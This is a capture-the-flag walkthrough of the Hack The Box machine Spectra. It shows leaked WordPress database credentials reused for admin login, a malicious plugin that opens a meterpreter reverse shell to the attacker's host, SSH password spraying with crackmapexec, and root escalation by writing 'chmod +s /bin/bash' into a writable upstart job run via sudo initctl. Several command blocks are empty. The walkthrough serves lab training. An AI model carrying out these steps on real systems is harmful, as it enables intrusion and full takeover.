## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash

```
As we can see we have only three pors opened 22, 80, 3306.  
As we can notice ssh is not disclosing any banner reporting the operating system of this box.  
Now, let's jump in into port 80.  
As we open the page we can see two links that redirects to `spectra.htb` now we can add this domain to our `/etc/hosts` file and dig deeper into this site.  
As we can see there are two sub-directories:  `testing/` and `main/` the main directory contains a wordpress site.  
if we run a wpscan against the site, nothing really interesting pop up except a user `administrator` .  
after our `init-target` script runs we can see in the nmap vuln the following interesting finding:  
```bash
|_  /testing/: Potentially interesting folder w/ directory listing
```
since directory listing is enabled we can browse webserver files and hopefully find some creds.  
if we mirror the site, we can instantily see a `wp-config.php.save` file containing the following:  
```php
/** The name of the database for WordPress */              
define( 'DB_NAME', 'dev' );                                

/** MySQL database username */                             
define( 'DB_USER', 'devtest' );                            

/** MySQL database password */                             
define( 'DB_PASSWORD', 'devteam01' );                      

/** MySQL hostname */                                      
define( 'DB_HOST', 'localhost' );       
```
This machine is affected by a password reuse vulnerability, hence using credentials `administrator:devteam01` we can log in into `wp-admin`  

## Foothold
Once we are in as administrator into a wordpress site, generally we could edit the theme and add a reverse shell into the theme pages.  
Unfortunately, this time, we cannot edit theme's pages since we get an upload error.  
Poking around on google we can find a [tool](https://github.com/wetw0rk/malicious-wordpress-plugin) that generates a wordpress plugin to inject a reverse shell. 
```bash

```
Once we generated the malicious plugin, we can upload the plugin into wordpress and hit the url `http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php` (ad described in the [tool's README.md](https://github.com/wetw0rk/malicious-wordpress-plugin)) and get a meterpreter session as user nginx.  
```bash
[*] Meterpreter session 1 opened (10.10.14.2:9002 -> 10.10.10.229:40280) at 2022-06-10 16:46:08 +0200

meterpreter > getuid
Server username: nginx
```
Since `nginx` user has it's own home directory, we can drop our ssh key and use a more stable shell:  
```bash
meterpreter > shell

```
now we can login as `nginx` via ssh.  
```

## User
Once we have an initial foothold, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice an `/etc/init/autologin.conf` file:  
```bash

  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script
```
reading the script we can see that a possible password file may be located in `/mnt/stateful_partition/etc/autologin/passwd` or `/etc/autologin/passwd` .  
```bash
nginx@spectra ~/log $ cat /etc/autologin/passwd
SummerHereWeCome!!
```
since we do not have any user for this password let's extract a list of users from `/etc/passwd` file and crack them using `crackmapexec`.  
```bash
[root@kali Spectra ]$  crackmapexec ssh $TARGET -u system_users.txt -p 'SummerHereWeCome!!'

SSH         10.10.10.229    22     10.10.10.229     [+] katie:SummerHereWeCome!! 
```
Now we can login as user katie with the discovered password:  
```bash
[root@kali htb-walkthroughs (main ✗)]$ ssh -l katie $TARGET                    
(katie@10.10.10.229) Password: 
-bash-4.3$ whoami
katie
```

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that katie has the following sudo permission:  
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```
additionally katie is part of `developers` group and hence has write permissions on the following `initctl` configuration files:  
```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)                                                                                                                                                                        
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files

/etc/init/test6.conf                                                                                                  
/etc/init/test7.conf                                                                                                                                                                                                                         
/etc/init/test3.conf                                                                                                                                                                                                                         
/etc/init/test4.conf                                                                                                  
/etc/init/test.conf
```
Now, we can change the content of, for example `/etc/init/test.conf` file and replace the actual file content with the following:  
```bash
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script
        chmod +s /bin/bash
end script
```
This will add suid bit to bash, and with suid bit we can run the bash command as root. Now we can execute the above stript by starting the service with:  
```bash
katie@spectra /etc/init $ sudo /sbin/initctl start test
test start/running, process 50538
katie@spectra /etc/init $ ls -l /bin/bash
-rwsr-sr-x 1 root root 551984 Dec 22  2020 /bin/bash
```
Now that we have the suid bit set, we can run `bash` as root using the `-p` flag:  
```
katie@spectra /etc/init $ bash -p
bash-4.3# whoami
root
```
According to the bash manual:  
```
-p  Turned on whenever the real and effective user ids do not match.
    Disables processing of the $ENV file and importing of shell
    functions.  Turning this option off causes the effective uid and
    gid to be set to the real uid and gid.
```
And we get a shell as root.
